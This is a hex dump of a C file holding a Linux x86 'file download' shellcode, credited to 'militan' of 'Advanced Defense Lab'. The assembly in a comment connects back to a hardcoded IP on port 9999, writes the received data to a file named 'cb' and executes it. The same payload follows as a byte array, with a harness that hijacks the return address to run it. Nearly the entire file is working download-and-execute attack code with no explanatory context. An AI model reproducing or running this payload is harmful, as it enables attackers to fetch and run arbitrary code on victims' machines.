00000000  2f 2a 0d 0a 3b 66 69 6c  65 20 64 6f 77 6e 6c 6f  |/*..;file downlo|
00000010  61 64 20 73 68 65 6c 6c  63 6f 64 65 20 28 31 34  |ad shellcode (14|
00000020  39 20 62 79 74 65 73 29  0d 0a 3b 0d 0a 3b 63 6f  |9 bytes)..;..;co|
00000030  6e 6e 65 63 74 20 62 61  63 6b 2c 20 64 6f 77 6e  |nnect back, down|
00000040  6c 6f 61 64 20 61 20 66  69 6c 65 20 61 6e 64 20  |load a file and |
00000050  65 78 65 63 75 74 65 2e  20 20 0d 0a 3b 6d 6f 64  |execute.  ..;mod|
00000060  69 66 79 20 74 68 65 20  6e 61 6d 65 20 6f 66 20  |ify the name of |
00000070  74 68 65 20 66 69 6c 65  20 61 6e 64 20 74 68 65  |the file and the|
00000080  20 69 70 20 61 64 64 72  65 73 73 20 66 69 72 73  | ip address firs|
00000090  74 2e 0d 0a 3b 0d 0a 3b  6d 69 6c 69 74 61 6e 0d  |t...;..;militan.|
000000a0  0a 3b 41 64 76 61 6e 63  65 64 20 44 65 66 65 6e  |.;Advanced Defen|
000000b0  73 65 20 4c 61 62 28 41  44 4c 29 0d 0a 3b 0d 0a  |se Lab(ADL)..;..|
000000c0  0d 0a 0d 0a 0d 0a 67 6c  6f 62 61 6c 20 5f 73 74  |......global _st|
000000d0  61 72 74 0d 0a 0d 0a 5f  73 74 61 72 74 3a 0d 0a  |art...._start:..|
000000e0  0d 0a 78 6f 72 20 65 63  78 2c 65 63 78 0d 0a 6d  |..xor ecx,ecx..m|
000000f0  75 6c 20 65 63 78 0d 0a  78 6f 72 20 65 62 78 2c  |ul ecx..xor ebx,|
00000100  65 62 78 0d 0a 63 64 71  0d 0a 0d 0a 3b 73 6f 63  |ebx..cdq....;soc|
00000110  6b 65 74 0d 0a 70 75 73  68 20 65 61 78 0d 0a 70  |ket..push eax..p|
00000120  75 73 68 20 62 79 74 65  20 30 78 31 0d 0a 70 75  |ush byte 0x1..pu|
00000130  73 68 20 62 79 74 65 20  30 78 32 0d 0a 6d 6f 76  |sh byte 0x2..mov|
00000140  20 65 63 78 2c 65 73 70  0d 0a 69 6e 63 20 65 62  | ecx,esp..inc eb|
00000150  78 0d 0a 6d 6f 76 20 61  6c 2c 30 78 36 36 0d 0a  |x..mov al,0x66..|
00000160  69 6e 74 20 30 78 38 30  0d 0a 6d 6f 76 20 65 64  |int 0x80..mov ed|
00000170  69 2c 65 61 78 20 20 20  20 20 20 20 20 20 20 20  |i,eax           |
00000180  20 20 3b 65 64 69 3d 73  6f 63 6b 66 64 0d 0a 0d  |  ;edi=sockfd...|
00000190  0a 0d 0a 3b 63 6f 6e 6e  65 63 74 2c 70 6f 72 74  |...;connect,port|
000001a0  28 39 39 39 39 29 3d 32  37 30 66 20 69 70 28 31  |(9999)=270f ip(1|
000001b0  34 30 2e 31 31 35 2e 35  33 2e 33 35 29 3d 28 38  |40.115.53.35)=(8|
000001c0  63 2e 37 33 2e 33 35 2e  32 33 29 20 20 0d 0a 70  |c.73.35.23)  ..p|
000001d0  75 73 68 20 65 64 78 0d  0a 70 75 73 68 20 6c 6f  |ush edx..push lo|
000001e0  6e 67 20 30 78 32 33 33  35 37 33 38 63 20 20 20  |ng 0x2335738c   |
000001f0  20 20 3b 61 64 64 72 65  73 73 20 2a 0d 0a 70 75  |  ;address *..pu|
00000200  73 68 20 77 6f 72 64 20  30 78 30 66 32 37 20 20  |sh word 0x0f27  |
00000210  20 20 20 20 20 20 3b 70  6f 72 74 20 20 20 20 2a  |      ;port    *|
00000220  20 0d 0a 6d 6f 76 20 64  6c 2c 30 78 30 32 0d 0a  | ..mov dl,0x02..|
00000230  70 75 73 68 20 64 78 20  20 20 20 20 20 20 20 20  |push dx         |
00000240  20 20 20 20 20 20 20 20  3b 66 61 6d 69 6c 79 20  |        ;family |
00000250  20 31 0d 0a 6d 6f 76 20  65 63 78 2c 65 73 70 20  | 1..mov ecx,esp |
00000260  20 20 20 20 20 20 20 20  20 20 20 20 20 3b 61 64  |             ;ad|
00000270  6a 75 73 74 20 73 74 72  75 63 74 0d 0a 70 75 73  |just struct..pus|
00000280  68 20 62 79 74 65 20 30  78 31 30 0d 0a 70 75 73  |h byte 0x10..pus|
00000290  68 20 65 63 78 20 20 20  0d 0a 70 75 73 68 20 65  |h ecx   ..push e|
000002a0  64 69 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |di              |
000002b0  20 20 3b 73 6f 63 6b 66  64 0d 0a 6d 6f 76 20 65  |  ;sockfd..mov e|
000002c0  63 78 2c 65 73 70 20 20  20 20 20 20 20 20 20 20  |cx,esp          |
000002d0  20 20 20 0d 0a 6d 6f 76  20 62 6c 2c 33 20 20 20  |   ..mov bl,3   |
000002e0  20 20 20 20 20 20 20 20  20 20 20 20 20 0d 0a 6d  |             ..m|
000002f0  6f 76 20 61 6c 2c 31 30  32 0d 0a 69 6e 74 20 30  |ov al,102..int 0|
00000300  78 38 30 0d 0a 0d 0a 3b  73 79 73 5f 6f 70 65 6e  |x80....;sys_open|
00000310  28 63 62 2c 4f 5f 57 52  4f 4e 4c 59 7c 4f 5f 43  |(cb,O_WRONLY|O_C|
00000320  52 45 41 54 45 7c 4f 5f  54 52 55 4e 43 5b 30 30  |REATE|O_TRUNC[00|
00000330  30 31 2e 30 31 30 30 2e  31 30 30 30 3d 31 31 30  |01.0100.1000=110|
00000340  31 5d 2c 37 30 30 29 0d  0a 78 6f 72 20 65 62 78  |1],700)..xor ebx|
00000350  2c 65 62 78 0d 0a 78 6f  72 20 65 63 78 2c 65 63  |,ebx..xor ecx,ec|
00000360  78 0d 0a 70 75 73 68 20  65 63 78 0d 0a 70 75 73  |x..push ecx..pus|
00000370  68 20 77 6f 72 64 20 30  78 36 32 36 33 20 20 20  |h word 0x6263   |
00000380  20 20 20 20 20 3b 66 69  6c 65 20 6e 61 6d 65 3d  |     ;file name=|
00000390  22 63 62 22 20 0d 0a 6d  6f 76 20 65 62 78 2c 65  |"cb" ..mov ebx,e|
000003a0  73 70 0d 0a 6d 6f 76 20  63 78 2c 30 78 32 34 32  |sp..mov cx,0x242|
000003b0  20 20 20 20 20 20 20 20  20 20 20 20 0d 0a 6d 6f  |            ..mo|
000003c0  76 20 64 78 2c 30 78 31  63 30 20 20 20 20 20 20  |v dx,0x1c0      |
000003d0  20 20 20 20 20 20 3b 4f  63 74 61 6c 0d 0a 6d 6f  |      ;Octal..mo|
000003e0  76 20 61 6c 2c 35 0d 0a  69 6e 74 20 30 78 38 30  |v al,5..int 0x80|
000003f0  0d 0a 6d 6f 76 20 65 73  69 2c 65 61 78 20 20 20  |..mov esi,eax   |
00000400  20 20 20 20 20 20 20 20  20 20 3b 65 73 69 3d 66  |          ;esi=f|
00000410  64 0d 0a 0d 0a 0d 0a 3b  0d 0a 78 6f 72 20 65 63  |d......;..xor ec|
00000420  78 2c 65 63 78 0d 0a 6d  75 6c 20 65 63 78 0d 0a  |x,ecx..mul ecx..|
00000430  63 64 71 0d 0a 6d 6f 76  20 64 78 2c 30 78 30 33  |cdq..mov dx,0x03|
00000440  65 38 20 20 20 20 20 20  20 20 20 3b 6d 65 6d 6f  |e8         ;memo|
00000450  72 79 20 63 68 75 6e 6b  3d 31 30 30 30 3d 30 78  |ry chunk=1000=0x|
00000460  30 33 65 38 3a 20 72 65  61 64 20 70 65 72 20 74  |03e8: read per t|
00000470  69 6d 65 20 20 20 20 20  20 20 0d 0a 20 20 20 20  |ime       ..    |
00000480  0d 0a 4c 31 3a 20 20 20  20 20 20 20 20 20 20 20  |..L1:           |
00000490  20 20 20 20 20 20 20 20  20 20 20 20 20 20 0d 0a  |              ..|
000004a0  3b 73 79 73 5f 72 65 61  64 28 73 6f 63 6b 65 74  |;sys_read(socket|
000004b0  20 73 6f 63 6b 66 64 2c  62 75 66 2c 6c 65 6e 29  | sockfd,buf,len)|
000004c0  20 20 20 20 20 20 20 20  20 20 20 20 0d 0a 78 6f  |            ..xo|
000004d0  72 20 65 62 78 2c 65 62  78 0d 0a 78 6f 72 20 65  |r ebx,ebx..xor e|
000004e0  61 78 2c 65 61 78 0d 0a  6d 6f 76 20 61 6c 2c 33  |ax,eax..mov al,3|
000004f0  0d 0a 6d 6f 76 20 65 62  78 2c 65 64 69 20 20 20  |..mov ebx,edi   |
00000500  20 20 20 20 20 20 20 20  20 3b 65 64 69 3d 73 6f  |         ;edi=so|
00000510  63 6b 20 66 64 0d 0a 6c  65 61 20 65 63 78 2c 5b  |ck fd..lea ecx,[|
00000520  65 73 70 2d 31 30 30 30  5d 20 20 20 20 20 20 3b  |esp-1000]      ;|
00000530  6d 65 6d 6f 72 79 20 63  68 75 6e 6b 0d 0a 69 6e  |memory chunk..in|
00000540  74 20 30 78 38 30 0d 0a  3b 73 79 73 5f 77 72 69  |t 0x80..;sys_wri|
00000550  74 65 28 66 64 2c 2a 62  75 66 2c 63 6f 75 6e 74  |te(fd,*buf,count|
00000560  29 0d 0a 6d 6f 76 20 65  62 78 2c 65 73 69 20 20  |)..mov ebx,esi  |
00000570  20 20 20 20 20 20 20 20  20 20 20 20 20 0d 0a 6d  |             ..m|
00000580  6f 76 20 65 64 78 2c 65  61 78 20 20 20 20 20 20  |ov edx,eax      |
00000590  20 20 20 20 20 20 20 20  0d 0a 78 6f 72 20 65 61  |        ..xor ea|
000005a0  78 2c 65 61 78 0d 0a 6d  6f 76 20 61 6c 2c 34 0d  |x,eax..mov al,4.|
000005b0  0a 69 6e 74 20 30 78 38  30 0d 0a 63 6d 70 20 64  |.int 0x80..cmp d|
000005c0  78 2c 30 78 30 33 65 38  20 20 20 20 20 20 20 20  |x,0x03e8        |
000005d0  20 20 0d 0a 6a 65 20 4c  31 20 20 20 20 20 20 20  |  ..je L1       |
000005e0  20 20 20 20 20 20 20 20  20 20 20 3b 6c 6f 6f 70  |           ;loop|
000005f0  0d 0a 0d 0a 0d 0a 43 4f  4e 54 49 4e 55 45 3a 0d  |......CONTINUE:.|
00000600  0a 3b 73 79 73 5f 63 6c  6f 73 65 28 66 64 29 0d  |.;sys_close(fd).|
00000610  0a 6d 6f 76 20 65 62 78  2c 65 73 69 20 20 20 20  |.mov ebx,esi    |
00000620  20 20 20 20 20 20 20 20  20 0d 0a 78 6f 72 20 65  |         ..xor e|
00000630  61 78 2c 65 61 78 0d 0a  6d 6f 76 20 61 6c 2c 36  |ax,eax..mov al,6|
00000640  0d 0a 69 6e 74 20 30 78  38 30 0d 0a 0d 0a 3b 65  |..int 0x80....;e|
00000650  78 65 63 76 65 5b 2e 2f  63 62 2c 30 5d 20 20 20  |xecve[./cb,0]   |
00000660  20 20 20 0d 0a 78 6f 72  20 65 63 78 2c 65 63 78  |   ..xor ecx,ecx|
00000670  0d 0a 6d 75 6c 20 65 63  78 0d 0a 70 75 73 68 20  |..mul ecx..push |
00000680  65 63 78 0d 0a 70 75 73  68 20 77 6f 72 64 20 30  |ecx..push word 0|
00000690  78 36 32 36 33 20 20 20  20 20 20 20 3b 66 69 6c  |x6263       ;fil|
000006a0  65 20 6e 61 6d 65 3d 22  63 62 22 20 0d 0a 6d 6f  |e name="cb" ..mo|
000006b0  76 20 65 62 78 2c 65 73  70 0d 0a 70 75 73 68 20  |v ebx,esp..push |
000006c0  65 63 78 0d 0a 70 75 73  68 20 65 62 78 20 20 20  |ecx..push ebx   |
000006d0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 0d  |               .|
000006e0  0a 6d 6f 76 20 65 63 78  2c 65 73 70 20 20 20 20  |.mov ecx,esp    |
000006f0  20 20 20 20 20 20 20 20  20 20 0d 0a 6d 6f 76 20  |          ..mov |
00000700  61 6c 2c 30 78 30 62 0d  0a 69 6e 74 20 30 78 38  |al,0x0b..int 0x8|
00000710  30 0d 0a 0d 0a 0d 0a 45  58 49 54 3a 0d 0a 78 6f  |0......EXIT:..xo|
00000720  72 20 65 61 78 2c 65 61  78 0d 0a 78 6f 72 20 65  |r eax,eax..xor e|
00000730  62 78 2c 65 62 78 20 0d  0a 69 6e 63 20 65 61 78  |bx,ebx ..inc eax|
00000740  0d 0a 69 6e 74 20 30 78  38 30 0d 0a 2a 2f 0d 0a  |..int 0x80..*/..|
00000750  0d 0a 23 69 6e 63 6c 75  64 65 3c 73 74 64 69 6f  |..#include<stdio|
00000760  2e 68 3e 0d 0a 23 69 6e  63 6c 75 64 65 3c 73 74  |.h>..#include<st|
00000770  72 69 6e 67 2e 68 3e 0d  0a 23 69 6e 63 6c 75 64  |ring.h>..#includ|
00000780  65 3c 73 74 64 6c 69 62  2e 68 3e 0d 0a 0d 0a 0d  |e<stdlib.h>.....|
00000790  0a 75 6e 73 69 67 6e 65  64 20 63 68 61 72 20 73  |.unsigned char s|
000007a0  68 65 6c 6c 63 6f 64 65  5b 5d 3d 22 5c 78 33 31  |hellcode[]="\x31|
000007b0  5c 78 63 39 5c 78 66 37  5c 78 65 31 5c 78 33 31  |\xc9\xf7\xe1\x31|
000007c0  5c 78 64 62 5c 78 39 39  5c 78 35 30 5c 78 36 61  |\xdb\x99\x50\x6a|
000007d0  5c 78 30 31 5c 78 36 61  5c 78 30 32 5c 78 38 39  |\x01\x6a\x02\x89|
000007e0  5c 78 65 31 5c 78 34 33  5c 78 62 30 5c 78 36 36  |\xe1\x43\xb0\x66|
000007f0  5c 78 63 64 5c 78 38 30  22 0d 0a 22 5c 78 38 39  |\xcd\x80".."\x89|
00000800  5c 78 63 37 5c 78 35 32  5c 78 36 38 5c 78 38 63  |\xc7\x52\x68\x8c|
00000810  5c 78 37 33 5c 78 33 35  5c 78 32 33 5c 78 36 36  |\x73\x35\x23\x66|
00000820  5c 78 36 38 5c 78 32 37  5c 78 30 66 5c 78 62 32  |\x68\x27\x0f\xb2|
00000830  5c 78 30 32 5c 78 36 36  5c 78 35 32 5c 78 38 39  |\x02\x66\x52\x89|
00000840  5c 78 65 31 5c 78 36 61  5c 78 31 30 5c 78 35 31  |\xe1\x6a\x10\x51|
00000850  5c 78 35 37 5c 78 38 39  5c 78 65 31 5c 78 62 33  |\x57\x89\xe1\xb3|
00000860  5c 78 30 33 5c 78 62 30  5c 78 36 36 5c 78 63 64  |\x03\xb0\x66\xcd|
00000870  5c 78 38 30 22 0d 0a 22  5c 78 33 31 5c 78 64 62  |\x80".."\x31\xdb|
00000880  5c 78 33 31 5c 78 63 39  5c 78 35 31 5c 78 36 36  |\x31\xc9\x51\x66|
00000890  5c 78 36 38 5c 78 36 33  5c 78 36 32 5c 78 38 39  |\x68\x63\x62\x89|
000008a0  5c 78 65 33 5c 78 36 36  5c 78 62 39 5c 78 34 32  |\xe3\x66\xb9\x42|
000008b0  5c 78 30 32 5c 78 36 36  5c 78 62 61 5c 78 63 30  |\x02\x66\xba\xc0|
000008c0  5c 78 30 31 5c 78 62 30  5c 78 30 35 5c 78 63 64  |\x01\xb0\x05\xcd|
000008d0  5c 78 38 30 22 0d 0a 0d  0a 22 5c 78 38 39 5c 78  |\x80"...."\x89\x|
000008e0  63 36 5c 78 33 31 5c 78  63 39 5c 78 66 37 5c 78  |c6\x31\xc9\xf7\x|
000008f0  65 31 5c 78 39 39 5c 78  36 36 5c 78 62 61 5c 78  |e1\x99\x66\xba\x|
00000900  65 38 5c 78 30 33 5c 78  33 31 5c 78 64 62 5c 78  |e8\x03\x31\xdb\x|
00000910  33 31 5c 78 63 30 5c 78  62 30 5c 78 30 33 5c 78  |31\xc0\xb0\x03\x|
00000920  38 39 5c 78 66 62 5c 78  38 64 5c 78 38 63 5c 78  |89\xfb\x8d\x8c\x|
00000930  32 34 5c 78 31 38 5c 78  66 63 5c 78 66 66 5c 78  |24\x18\xfc\xff\x|
00000940  66 66 5c 78 63 64 5c 78  38 30 5c 78 38 39 5c 78  |ff\xcd\x80\x89\x|
00000950  66 33 5c 78 38 39 5c 78  63 32 5c 78 33 31 5c 78  |f3\x89\xc2\x31\x|
00000960  63 30 5c 78 62 30 5c 78  30 34 5c 78 63 64 5c 78  |c0\xb0\x04\xcd\x|
00000970  38 30 22 0d 0a 22 5c 78  36 36 5c 78 38 31 5c 78  |80".."\x66\x81\x|
00000980  66 61 5c 78 65 38 5c 78  30 33 5c 78 37 34 5c 78  |fa\xe8\x03\x74\x|
00000990  64 65 5c 78 38 39 5c 78  66 33 5c 78 33 31 5c 78  |de\x89\xf3\x31\x|
000009a0  63 30 5c 78 62 30 5c 78  30 36 5c 78 63 64 5c 78  |c0\xb0\x06\xcd\x|
000009b0  38 30 5c 78 33 31 5c 78  63 39 5c 78 66 37 5c 78  |80\x31\xc9\xf7\x|
000009c0  65 31 5c 78 35 31 5c 78  36 36 5c 78 36 38 5c 78  |e1\x51\x66\x68\x|
000009d0  36 33 5c 78 36 32 5c 78  38 39 5c 78 65 33 5c 78  |63\x62\x89\xe3\x|
000009e0  35 31 5c 78 35 33 5c 78  38 39 5c 78 65 31 5c 78  |51\x53\x89\xe1\x|
000009f0  62 30 5c 78 30 62 5c 78  63 64 5c 78 38 30 22 0d  |b0\x0b\xcd\x80".|
00000a00  0a 22 5c 78 33 31 5c 78  63 30 5c 78 33 31 5c 78  |."\x31\xc0\x31\x|
00000a10  64 62 5c 78 34 30 5c 78  63 64 5c 78 38 30 22 3b  |db\x40\xcd\x80";|
00000a20  0d 0a 0d 0a 76 6f 69 64  20 6b 28 29 7b 0d 0a 20  |....void k(){.. |
00000a30  69 6e 74 20 2a 72 65 74  3b 0d 0a 20 72 65 74 3d  |int *ret;.. ret=|
00000a40  28 69 6e 74 20 2a 29 26  72 65 74 2b 32 3b 0d 0a  |(int *)&ret+2;..|
00000a50  20 28 2a 72 65 74 29 3d  28 69 6e 74 29 73 68 65  | (*ret)=(int)she|
00000a60  6c 6c 63 6f 64 65 3b 0d  0a 7d 0d 0a 0d 0a 69 6e  |llcode;..}....in|
00000a70  74 20 6d 61 69 6e 20 28  29 7b 0d 0a 20 20 6b 28  |t main (){..  k(|
00000a80  29 3b 0d 0a 20 20 72 65  74 75 72 6e 20 30 3b 0d  |);..  return 0;.|
00000a90  0a 7d                                             |.}|
00000a92
